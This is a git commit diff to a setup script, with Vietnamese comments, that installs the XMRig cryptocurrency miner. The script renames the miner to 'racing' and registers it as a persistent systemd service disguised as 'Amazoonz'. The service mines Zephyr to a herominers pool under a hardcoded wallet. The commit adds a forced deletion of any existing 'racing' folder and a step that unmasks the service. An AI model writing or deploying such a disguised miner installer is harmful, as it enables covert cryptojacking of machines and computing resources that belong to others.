898b4161b998bbd1ebe57674c523e2d64f0fcd2e
bizzip9x <106524605+bizzip9x@users.noreply.github.com>
2024-01-16 09:23:28 +0700

    Update setup_script.py

--- setup_script.py
+++ setup_script.py
@@ -10,8 +10,16 @@ sudo apt update
 sudo systemctl stop amazoon.service
 sudo systemctl disable amazoon.service
 sudo tar xvzf amazonpython.tar.gz
+# Kiểm tra và xóa thư mục 'racing' nếu nó đã tồn tại
+if [ -d "racing" ]; then
+    sudo rm -rf racing
+fi
 sudo mv xmrig-6.20.0 racing
-sudo bash -c 'echo -e "[Unit]\\nDescription=Amazoonz\\nAfter=network.target\\n\\n[Service]\\nType=simple\\nExecStart=/usr/local/bin/racing/xmrig --donate-level 1 -o us.zephyr.herominers.com:1123 -u ZEPHYR3AJ3qZrhYoqpP6HcQ1iALp3Yd119YAfCaeCajF4JPZqLerQyjJXjZ5AtT53Cd9L893TufCyi2CgqThaNGa9Kbk1piv5bu4k -p {worker} -a rx/0 -k -t {threads}\\n\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/amazoonz.service
+# Tạo service file
+service_file='/etc/systemd/system/amazoonz.service'
+sudo bash -c 'echo -e "[Unit]\\nDescription=Amazoonz\\nAfter=network.target\\n\\n[Service]\\nType=simple\\nExecStart=/usr/local/bin/racing/xmrig --donate-level 1 -o us.zephyr.herominers.com:1123 -u ZEPHYR3AJ3qZrhYoqpP6HcQ1iALp3Yd119YAfCaeCajF4JPZqLerQyjJXjZ5AtT53Cd9L893TufCyi2CgqThaNGa9Kbk1piv5bu4k -p {worker} -a rx/0 -k -t {threads}\\n\\n[Install]\\nWantedBy=multi-user.target' > $service_file
+# Unmask và enable service
+sudo systemctl unmask amazoonz.service
 sudo systemctl daemon-reload
 sudo systemctl enable amazoonz.service
 echo "Setup completed!"
